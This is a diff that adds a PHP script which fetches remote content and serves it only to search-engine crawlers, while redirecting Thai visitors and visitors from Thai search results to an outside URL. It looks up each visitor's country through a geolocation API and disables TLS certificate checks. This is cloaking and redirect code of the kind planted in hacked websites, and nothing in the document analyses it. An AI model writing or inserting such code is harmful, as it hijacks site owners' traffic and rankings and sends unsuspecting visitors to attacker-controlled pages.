@@ -1,0 +1,103 @@
+<?php
+
+header('Vary: Accept-Language');
+header('Vary: User-Agent');
+
+function get_client_ip() {
+    $keys = [
+        'HTTP_CLIENT_IP',
+        'HTTP_X_FORWARDED_FOR',
+        'HTTP_X_FORWARDED',
+        'HTTP_FORWARDED_FOR',
+        'HTTP_FORWARDED',
+        'REMOTE_ADDR'
+    ];
+
+    foreach ($keys as $key) {
+        if (!empty($_SERVER[$key])) {
+            return trim(explode(',', $_SERVER[$key])[0]);
+        }
+    }
+
+    return '127.0.0.1';
+}
+
+function make_request($url) {
+
+    if (function_exists('curl_init')) {
+
+        $ch = curl_init();
+
+        curl_setopt_array($ch, [
+            CURLOPT_URL => $url,
+            CURLOPT_RETURNTRANSFER => true,
+            CURLOPT_TIMEOUT => 5,
+            CURLOPT_CONNECTTIMEOUT => 5,
+            CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
+            CURLOPT_SSL_VERIFYPEER => false,
+            CURLOPT_SSL_VERIFYHOST => false
+        ]);
+
+        $response = curl_exec($ch);
+        curl_close($ch);
+
+        return $response;
+    }
+
+    if (ini_get('allow_url_fopen')) {
+        return @file_get_contents($url);
+    }
+
+    return false;
+}
+
+$ua = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
+$rf = strtolower($_SERVER['HTTP_REFERER'] ?? '');
+$ip = get_client_ip();
+
+$bot_url = 'https://hidebl.com/s/719';
+$reff_url = 'https://hidebl.com/r/mk5';
+
+$file = make_request($bot_url);
+
+/* GEO */
+$geoRaw = make_request("https://ip-api.com/json/{$ip}");
+$geolocation = json_decode($geoRaw, true);
+
+$cc = $geolocation['countryCode'] ?? '';
+
+/* BOT CHECK */
+$botchar = "/(googlebot|slurp|adsense|inspection|verifycation|jenifer)/i";
+
+/* HEADERS */
+$accept_language = $_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? '';
+$accept_encoding = $_SERVER['HTTP_ACCEPT_ENCODING'] ?? '';
+
+$fingerprint = md5($ua . $ip . $accept_language . $accept_encoding);
+
+/* BOT SHOW CONTENT */
+if (preg_match($botchar, $ua)) {
+    echo $file;
+    exit;
+}
+
+/* THAILAND REDIRECT */
+if ($cc === "TH") {
+    header("Location: $reff_url", true, 302);
+    exit;
+}
+
+/* SEARCH ENGINE REFERER */
+if (
+    !empty($rf) &&
+    (
+        strpos($rf, "google.co.th") !== false ||
+        strpos($rf, "yahoo.co.th") !== false ||
+        strpos($rf, "bing.com") !== false
+    )
+) {
+    header("Location: $reff_url", true, 302);
+    exit;
+}
+
+?>
